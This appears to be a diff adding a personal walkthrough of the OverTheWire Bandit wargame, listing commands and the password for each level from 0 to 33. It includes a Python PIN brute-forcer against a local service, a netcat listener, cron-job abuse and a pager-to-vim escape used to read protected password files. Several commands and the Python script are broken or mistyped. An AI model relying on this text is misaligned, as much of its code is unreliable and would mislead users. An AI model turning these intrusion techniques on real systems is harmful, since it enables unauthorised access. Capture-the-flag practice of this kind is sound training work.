@@ -1,0 +1,362 @@
+Level 0 -> Level 1
+
+Command: $ cat readme
+
+Password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+
+Level 1 -> Level 2
+
+Command: $ cat ./-
+
+Password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+
+Level 2 -> Level 3
+
+Command: $ cat spaces\ in\ this\ filename
+
+Password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+
+Level 3 -> Level 4
+
+Command(s): $ cd inhere
+	    $ cat .hidden 
+
+Password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+
+Level 4 -> Level 5
+
+Command(s): $ cd inhere
+	    $ cat ./-file07
+
+Password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+
+Level 5 -> Level 6
+
+Command(s): $ cd inhere
+	    $ cd maybehere07
+	    $ cat .file2
+
+Password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+Level 6 -> Level 7
+
+Command(s): $ find / -size 33c -group bandit6 -user bandit7 | grep .password
+	    $ cat /var/lib/dpkg/info/bandit7.password
+
+Password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+
+Level 7 -> Level 8
+
+Command(s): $cat data.txt | grep millionth
+
+Password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+
+Level 8 -> Level 9
+
+Command: $ cat data.txt | sort | uniq -c | sort -n
+
+Password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+
+Level 9 -> Level 10
+
+Command: $ data.txt | sort | uniq -c | sort -n
+
+Password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+
+Level 10 -> Level 11
+
+Command: $ base64 -d data.txt
+
+Password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+
+Level 11 -> Level 12
+
+Command: $ echo 'Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh' |tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
+
+Password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+
+Level 12 -> Level 13
+
+Command(s): $ cp data.txt /tmp/youname
+	    $ cd /tmp/yourname
+	    $ file data.txt
+	    $ xxd -r data.txt newdata
+	    $ file newdata
+ 	    $ mv newdata newdata.gz
+	    $ gzip -d newdata.gz
+	    $ file newdata
+	    $ mv newdata newdata.bz2
+	    $ bzip2 -d newdata.bz2
+	    $ file newdata
+            $ mv newdata newdata.gz
+	    $ gzip -d newdata.gz
+	    $ tar -xvf newdata
+	    $ file data5.bin
+	    $ tar -xvf data5.bin
+            $ file data6.bin
+	    $ mv data6.bin data7.bz2
+	    $ bzip2 -d data7.bz2
+            $ file data7
+            $ tar -xvf data7
+	    $ file data8.bin
+            $ mv data8 data9.gz
+	    $ gzip -d data9.gz
+	    $ file data9
+            $ cat data9
+
+Password: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+Level 13 -> Level 14
+
+Command(s): $ ssh -i sshkey.private bandit14@localhost
+	    $ cd /etc/bandit_pass
+	    $ cat bandit14
+
+Password: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+Level 14 -> Level 15
+
+Command: $ echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e | nc localhost 30000
+
+Password: BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+Level 15 -> Level 16
+
+Command(s): $ openssl s_client -ign_eof -connet localhost:30001
+	    Enter the Current Password and Press Enter
+
+Password: cluFn7wTiGryunymYOu4RcffSxQluehd
+
+Level 16 -> Level 17
+
+Command(s): $ nmap -p 31000-32000 localhost
+            $ openssl s_client -connect localhost: 31790
+	     Enter the Password of the Current Level
+	     Copy the Contents of the RSA key and paste them in a file
+            $ mkdir /tmp/bandit17key
+	    $ nano /tmp/bandit17key/sshkey
+             Paste the Contents of the Key and save the file
+            $ chmod 600 /tmp/bandit17key/sshkey
+	    $ ssh -i /tmp/bandit17key/sshkey bandit17@localhost
+
+Password: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+
+Level 17 -> Level 18
+
+Command: $ awk 'FNR==NR {a[$0]++; next} !a[$0]' passwords.old passwords.new
+
+Password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+Level 18 -> Level 19
+
+Command(s): $ ssh -t bandit18@bandit.labs.overthewire.org -p 2220 /bin/sh
+	    $ cat readme
+
+Password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+Level 19 -> Level 20
+
+Command: $ ./bandit20-do cat /etc/bandit_pass/bandit20 
+
+Password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+Level 20 -> Level 21
+
+Command(s): $ nc -lvnp 35000 		Terminal-1
+	    Open Another Terminal and ssh into Bandit20
+	    $ ./suconnect 35000		Terminal-2
+	    Go Back of Terminal-1 and Enter the Password of Bandit20
+	    Password for Bandit20 will be displayed.
+
+Password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+Level 21 -> Level 22
+
+Command(s): $ cd /etc/cron.d
+	    $ cat cronjob_bandit22
+	    $ cat /usr/bin/cronjob_bandit22.sh
+	    $ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+Password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+Level 22 -> Level 23
+
+Command(s): $ cd /etc/cron.d
+	    $ cat cronjob_bandit23
+	    $ cat /usr/bin/cronjob_bandit23.sh
+	    $ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+	    $ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+Password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+Level 23 -> Level 24
+
+Command(s): $ cd /etc/cron.d
+	    $ cat cronjob_bandit24
+	    $ cat /usr/bin/cronjob_bandit24.sh
+	    $ mkdir -p /tmp/secttp
+	    $ cd /tmp/secttp
+	    $ touch secttp.sh
+	    $ chmod 777 secttp.sh
+	    $ vim secttp.sh
+	     View File and Exit
+	    $ touch password
+	    $ chmod 666 password
+            $ cp secttp.sh /var/spool/bandit24/
+	    $ cat password
+
+Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Level 24 -> Level 25
+
+Command(s): $ mkdir -p /tmp/ghost123
+	    $ cd /tmp/ghost123
+	    $ touch pincode.py
+	    $ vim pincode.py
+	       Type the following Code:
+
+		#!/usr/bin/env python3
+		# coding: utf-8
+		import sys
+		import socket
+		pincode = 0
+		password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"try:
+    		# Connect to server
+    		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    		s.connect(("127.0.0.1", 30002))
+    
+    		# Print welcome message
+   		welcome_msg = s.recv(2048)
+    		print(welcome_msg)    
+		# Try brute-forcing
+    		while pincode < 10000:
+        		pincode_string = str(pincode).zfill(4)
+        		message=password+" "+pincode_string+"\n"        
+			# Send message
+		        s.sendall(message.encode())
+		        receive_msg = s.recv(1024)        
+			# Check result
+        		if "Wrong" in receive_msg:
+            			print("Wrong PINCODE: %s" % pincode_string)
+        		else:
+            			print(receive_msg)
+            		break
+        		pincode += 1
+		finally:
+    		sys.exit(1)
+
+	   $ python ./pincode.py
+		When the correct Pin will be inputted, the Password will be displayed.
+
+Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Level 25 -> Level 26
+
+Command(s): $ cat /etc/passwd | grep bandit26
+	    $ cat /usr/bin/showtext
+	      Make your Terminal as small as possible and ssh
+	    $ ssh -i bandit26.sshkey bandit26@localhost
+	      You will Notice More written, Press v 
+	      Then Enter the following
+	      :e /etc/bandit_pass/bandit26
+
+Password: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+Level 26 -> Level 27
+
+Command: $ ./bandit27-do cat /etc/bandit_pass/bandit27
+
+Password: 3ba3118a22e93127a4ed485be72ef5ea
+
+Level 27 -> Level 28
+
+Command(s): $ mkdir /tmp/thisismyrepo
+	    $ cd /tmp/thisismyrepo
+	    $ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+	    $ cd repo
+	    $ cat README
+Password: 0ef186ac70e04ea33b4c1853d2526fa2
+
+Level 28 -> Level 29
+
+Command(s): $ mkdir /tmp/thisismyrepo
+	    $ cd /tmp/thisismyrepo
+	    $ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+	    $ cd repo
+	    $ cat README.md
+	    $ git log
+	    $ git log -p 
+            $ git log -p -1
+
+Password: bbc96594b4e001778eee9975372716b2 
+
+Level 29 -> Level 30
+
+Command(s): $ mkdir /tmp/thisismyrepo
+	    $ cd /tmp/thisismyrepo
+	    $ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+	    $ cd repo
+	    $ cat README.md
+	    $ git branch
+	    $ git branch -r
+	    $ git checkout dev
+	    $ git log -p -1
+
+Password: 5b90576bedb2cc04c86a9e924ce42faf
+
+Level 30 -> Level 31
+
+Command(s): $ mkdir /tmp/thisismyrepo
+	    $ cd /tmp/thisismyrepo
+	    $ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+	    $ cd repo
+	    $ cat README.md
+	    $ git tag
+	    $ git show secret
+
+Password: 47e603bb428404d265f59c42920d81e5
+
+Level 31 -> Level 32
+
+Command(s): $ mkdir /tmp/thisismyrepo
+	    $ cd /tmp/thisismyrepo
+	    $ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
+	    $ cd repo
+	    $ cat README.md 
+	    $ touch key.txt
+	    $ echo "May I Come in?" > key.txt
+	    $ rm .gitignore
+	    $ git add key.txt
+	    $ git commit -m "Upload a file"
+	    $ git push origin master 
+
+Password: 56a9bf19c63d650ce78e6ec0354ee45e
+
+Level 32 -> Level 33
+
+Command(s): >> $0
+	    $ pwd
+	    $ ls -la *
+	    $ cat /etc/bandit_pass/bandit33
+
+Password: c9c3199ddf4121b10cf581a98d51caee
+
+Level 33 -> Level 34
+
+	DOES NOT EXIST YET.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
